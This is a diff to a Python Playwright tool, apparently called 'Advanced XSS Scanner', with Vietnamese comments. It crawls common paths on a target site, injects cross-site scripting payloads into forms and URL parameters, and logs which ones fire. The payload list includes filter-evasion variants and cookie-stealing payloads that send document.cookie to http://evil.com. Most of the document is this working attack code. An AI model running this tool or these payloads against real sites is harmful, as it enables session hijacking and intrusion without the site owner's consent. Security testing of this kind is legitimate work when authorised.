@@ -6,94 +6,34 @@ from urllib.parse import urljoin
 from playwright.sync_api import sync_playwright
 
 # Thiết lập logging
-logging.basicConfig(filename='scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+logging.basicConfig(filename='scan.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Danh sách payloads XSS mở rộng
 XSS_PAYLOADS = [
-    # Payloads cơ bản
-    "<script>alert('XSS')</script>",
-    "<img src=x onerror=alert('XSS')>",
-    "<svg/onload=alert('XSS')>",
-    "javascript:alert('XSS')",
-    "<script>alert(123)</script>",
-
-    # Payloads vượt qua bộ lọc đơn giản
-    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
-    "<SCRIPT>alert('XSS')</SCRIPT>",
-    "<ScRiPt>alert('XSS')</ScRiPt>",
-    "<script src='javascript:alert(\"XSS\")'>",
-    "<script>eval('ale'+'rt(\"XSS\")')</script>",
-
-    # Payloads dựa trên sự kiện (event-based)
-    "<img src=x onerror=alert(1)>",
-    "<body onload=alert('XSS')>",
-    "<div onmouseover=alert('XSS')>Hover me!</div>",
-    "<input type='text' onfocus=alert('XSS') autofocus>",
-    "<iframe src='javascript:alert(\"XSS\")'>",
-    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
-
-    # Payloads sử dụng các thẻ HTML khác
-    "<svg><script>alert('XSS')</script></svg>",
-    "<embed src='javascript:alert(\"XSS\")'>",
-    "<object data='javascript:alert(\"XSS\")'>",
-    "<math><maction actiontype='statusline#http://evil.com' xlink:href='javascript:alert(\"XSS\")'>Click</maction></math>",
-    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
-
-    # Payloads dựa trên thuộc tính HTML
-    "<div style='xss:expr/*XSS*/ession(alert(\"XSS\"))'>",
-    "<img src='x' style='xss:expression(alert(\"XSS\"))'>",
-    "<div style='background-image:url(\"javascript:alert('XSS')\")'>",
-    "<input value='x' onclick='alert(\"XSS\")'>",
-    "<form action='javascript:alert(\"XSS\")'><button>Submit</button></form>",
-
-    # Payloads vượt qua bộ lọc nâng cao
-    "<img src=`x` onerror=`alert('XSS')`>",
-    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
-    "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
-    "<img src=x onerror=eval('ale'+'rt(1)')>",
-    "<script>eval('window[\"ale'+'rt\"](\"XSS\")')</script>",
-
-    # Payloads DOM-based XSS
-    "javascript:alert(document.location)",
-    "javascript:alert(document.cookie)",
-    "javascript:void(document.body.innerHTML='<h1>XSS</h1>')",
-    "javascript:document.write('<script>alert(\"XSS\")</script>')",
-    "javascript:window.location='http://evil.com?' + document.cookie",
-
-    # Payloads sử dụng các ký tự đặc biệt
-    "<script>alert('XSS')</script".replace(">", ">"),
-    "<script>alert('XSS')</script".replace("<", "<"),
-    "'';!--\"<XSS>=&{()}",
-    "<script>alert('XSS')//",
-    "<script>alert('XSS')<!--",
-
-    # Payloads nhắm đến các trường hợp cụ thể
-    "test@example.com<script>alert('XSS')</script>",
-    "test@example.com\" onmouseover=\"alert('XSS')",
-    "<textarea onfocus=alert('XSS') autofocus>",
-    "<select onchange=alert('XSS')><option>XSS</option></select>",
-    "<details open ontoggle=alert('XSS')>XSS</details>",
-
-    # Payloads sử dụng các kỹ thuật phức tạp
-    "<base href='javascript:alert(\"XSS\")//'>",
-    "<script src='data:text/javascript,alert(\"XSS\")'></script>",
-    "<script>fetch('http://evil.com?' + document.cookie)</script>",
-    "<img src=x onerror='fetch(\"http://evil.com?\" + document.cookie)'>",
-    "<script>new Image().src='http://evil.com?c='+document.cookie;</script>",
-
-    # Payloads dạng mã hóa (Unicode, HTML entities)
-    "<script>alert('XSS')</script>",
-    "<script>alert('XSS')</script>",
-    "\x3cscript\x3ealert('XSS')\x3c/script\x3e",
-    "%3Cscript%3Ealert('XSS')%3C/script%3E",
-    "<scr%69pt>alert('XSS')</scr%69pt>",
-
-    # Payloads ngắn gọn để vượt qua giới hạn ký tự
-    "<svg onload=alert(1)>",
-    "<img/src=x onerror=alert(1)>",
-    "<a href=javascript:alert(1)>x</a>",
-    "<b/onclick=alert(1)>x</b>",
-    "<script>alert`1`</script>",
+    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>",
+    "javascript:alert('XSS')", "<script>alert(123)</script>", "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+    "<SCRIPT>alert('XSS')</SCRIPT>", "<ScRiPt>alert('XSS')</ScRiPt>", "<script src='javascript:alert(\"XSS\")'>",
+    "<script>eval('ale'+'rt(\"XSS\")')</script>", "<img src=x onerror=alert(1)>", "<body onload=alert('XSS')>",
+    "<div onmouseover=alert('XSS')>Hover me!</div>", "<input type='text' onfocus=alert('XSS') autofocus>",
+    "<iframe src='javascript:alert(\"XSS\")'>", "<a href='javascript:alert(\"XSS\")'>Click me</a>",
+    "<svg><script>alert('XSS')</script></svg>", "<embed src='javascript:alert(\"XSS\")'>",
+    "<object data='javascript:alert(\"XSS\")'>", "<math><maction actiontype='statusline#http://evil.com' xlink:href='javascript:alert(\"XSS\")'>Click</maction></math>",
+    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>", "<div style='xss:expr/*XSS*/ession(alert(\"XSS\"))'>",
+    "<img src='x' style='xss:expression(alert(\"XSS\"))'>", "<div style='background-image:url(\"javascript:alert('XSS')\")'>",
+    "<input value='x' onclick='alert(\"XSS\")'>", "<form action='javascript:alert(\"XSS\")'><button>Submit</button></form>",
+    "<img src=`x` onerror=`alert('XSS')`>", "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+    "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>", "<img src=x onerror=eval('ale'+'rt(1)')>",
+    "<script>eval('window[\"ale'+'rt\"](\"XSS\")')</script>", "javascript:alert(document.location)",
+    "javascript:alert(document.cookie)", "javascript:void(document.body.innerHTML='<h1>XSS</h1>')",
+    "javascript:document.write('<script>alert(\"XSS\")</script>')", "javascript:window.location='http://evil.com?' + document.cookie",
+    "'';!--\"<XSS>=&{()}", "<script>alert('XSS')//", "<script>alert('XSS')<!--", "test@example.com<script>alert('XSS')</script>",
+    "test@example.com\" onmouseover=\"alert('XSS')", "<textarea onfocus=alert('XSS') autofocus>",
+    "<select onchange=alert('XSS')><option>XSS</option></select>", "<details open ontoggle=alert('XSS')>XSS</details>",
+    "<base href='javascript:alert(\"XSS\")//'>", "<script src='data:text/javascript,alert(\"XSS\")'></script>",
+    "<script>fetch('http://evil.com?' + document.cookie)</script>", "<img src=x onerror='fetch(\"http://evil.com?\" + document.cookie)'>",
+    "<script>new Image().src='http://evil.com?c='+document.cookie;</script>", "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "<scr%69pt>alert('XSS')</scr%69pt>", "<svg onload=alert(1)>", "<img/src=x onerror=alert(1)>",
+    "<a href=javascript:alert(1)>x</a>", "<b/onclick=alert(1)>x</b>", "<script>alert`1`</script>",
 ]
 
 # Danh sách các đường dẫn phổ biến để quét
@@ -126,6 +66,7 @@ signal.signal(signal.SIGINT, signal_handler)
 def scan_initial_paths(target):
     valid_paths = []
     print(f"\n[*] Scanning initial paths on {target}...")
+    logging.info(f"Scanning initial paths on {target}")
 
     with sync_playwright() as playwright:
         browser = playwright.chromium.launch(headless=True)
@@ -146,11 +87,13 @@ def scan_initial_paths(target):
 
                 if status in [200, 403, 401]:
                     print(f"[+] Found valid path: {path} - Status: {status}")
+                    logging.info(f"Found valid path: {path} - Status: {status}")
                     valid_paths.append(full_url)
                 else:
                     print(f"[-] Invalid path: {path} - Status: {status}")
             except Exception as e:
                 print(f"[-] Error on {path}: {e} - Status: Unknown")
+                logging.error(f"Error on {path}: {e}")
             time.sleep(0.5)
 
         browser.close()
@@ -160,6 +103,7 @@ def scan_initial_paths(target):
 def exploit_xss(url, payloads):
     global stop_scanning
     print(f"\n[*] Testing XSS on {url}...")
+    logging.info(f"Testing XSS on {url}")
     results = []
 
     with sync_playwright() as playwright:
@@ -168,15 +112,15 @@ def exploit_xss(url, payloads):
             ignore_https_errors=True,
             user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
         )
-        page = None
+        page = context.new_page()
 
         try:
-            page = context.new_page()
             alert_triggered = False
             def handle_dialog(dialog):
                 nonlocal alert_triggered
                 alert_triggered = True
                 print(f"[*] Alert triggered on {url}: {dialog.message}")
+                logging.info(f"Alert triggered on {url}: {dialog.message}")
                 dialog.accept()
 
             page.on("dialog", handle_dialog)
@@ -189,29 +133,33 @@ def exploit_xss(url, payloads):
             forms = page.query_selector_all("form")
             if forms:
                 print(f"[*] Found {len(forms)} forms on {url}. Testing payloads...")
+                logging.info(f"Found {len(forms)} forms on {url}")
                 for form in forms:
-                    # Tạo lại page để tránh lỗi mất context
-                    page.close()
-                    page = context.new_page()
-                    page.on("dialog", handle_dialog)
-                    page.goto(url, timeout=30000)
-                    page.wait_for_load_state("networkidle", timeout=30000)
-                    form = page.query_selector("form")
-
+                    if stop_scanning:
+                        break
                     for payload in payloads:
                         if stop_scanning:
                             break
+                        if not page.is_closed():
+                            page.close()
+                        page = context.new_page()
+                        page.on("dialog", handle_dialog)
+                        page.goto(url, timeout=30000)
+                        page.wait_for_load_state("networkidle", timeout=30000)
+                        form = page.query_selector("form")
+
                         inputs = form.query_selector_all("input, textarea")
                         for input_field in inputs:
                             input_name = input_field.get_attribute("name") or "unnamed"
                             input_type = input_field.get_attribute("type") or "text"
-                            # Bỏ qua các trường ẩn hoặc không thể chỉnh sửa
-                            if input_type in ["hidden", "submit", "button"]:
+                            # Bỏ qua các trường không phù hợp
+                            if input_type in ["file", "hidden", "submit", "button"]:
                                 continue
                             try:
                                 page.fill(f"[name='{input_name}']", payload)
                             except Exception as e:
                                 print(f"[!] Error filling input {input_name}: {e}")
+                                logging.error(f"Error filling input {input_name}: {e}")
 
                         # Submit form
                         try:
@@ -223,6 +171,7 @@ def exploit_xss(url, payloads):
                             page.wait_for_load_state("networkidle", timeout=10000)
                         except Exception as e:
                             print(f"[!] Error submitting form: {e}")
+                            logging.error(f"Error submitting form: {e}")
 
                         # Kiểm tra Stored XSS
                         if payload in page.content():
@@ -243,10 +192,11 @@ def exploit_xss(url, payloads):
                 if stop_scanning:
                     break
                 test_url = f"{url}?q={payload}&search={payload}&test={payload}"
-                try:
+                if not page.is_closed():
                     page.close()
-                    page = context.new_page()
-                    page.on("dialog", handle_dialog)
+                page = context.new_page()
+                page.on("dialog", handle_dialog)
+                try:
                     page.goto(test_url, timeout=30000)
                     page.wait_for_load_state("networkidle", timeout=30000)
                     if payload in page.content():
@@ -261,11 +211,13 @@ def exploit_xss(url, payloads):
                         logging.info(result)
                 except Exception as e:
                     print(f"[!] Error testing Reflected XSS on {test_url}: {e}")
+                    logging.error(f"Error testing Reflected XSS on {test_url}: {e}")
 
         except Exception as e:
             print(f"[!] Error accessing {url}: {e}")
+            logging.error(f"Error accessing {url}: {e}")
         finally:
-            if page:
+            if not page.is_closed():
                 page.close()
             browser.close()
 
@@ -275,6 +227,7 @@ def exploit_xss(url, payloads):
 def auto_exploit(target, paths, payloads):
     global stop_scanning, results_found
     print(f"\n[*] Starting XSS scan on {target}...")
+    logging.info(f"Starting XSS scan on {target}")
 
     for path in paths:
         if stop_scanning:
@@ -287,6 +240,7 @@ def auto_exploit(target, paths, payloads):
             for result in results_found:
                 f.write(result + "\n")
         print("\n[*] Results saved to 'scan_results.txt'")
+        logging.info("Results saved to 'scan_results.txt'")
 
 # Hàm chính
 def main(target):
@@ -298,6 +252,7 @@ def main(target):
     try:
         print("=== Advanced XSS Scanner ===")
         print(f"Scanning {target} for XSS vulnerabilities...")
+        logging.info(f"Scanning {target} for XSS vulnerabilities")
         
         # Ensure the target URL has a scheme (http:// or https://)
         if not target.startswith(("http://", "https://")):
@@ -312,13 +267,17 @@ def main(target):
 
         if valid_paths:
             print(f"\n[*] Found {len(valid_paths)} valid paths: {valid_paths}")
+            logging.info(f"Found {len(valid_paths)} valid paths: {valid_paths}")
             auto_exploit(target, valid_paths, XSS_PAYLOADS)
         else:
             print("[!] No valid paths found. XSS scan skipped.")
+            logging.warning("No valid paths found. XSS scan skipped.")
 
         print("XSS scan completed!")
+        logging.info("XSS scan completed")
     except Exception as e:
         print(f"Error in XSS_auto: {e}")
+        logging.error(f"Error in XSS_auto: {e}")
 
 if __name__ == "__main__":
     print("[*] Starting XSS scanning tool...")
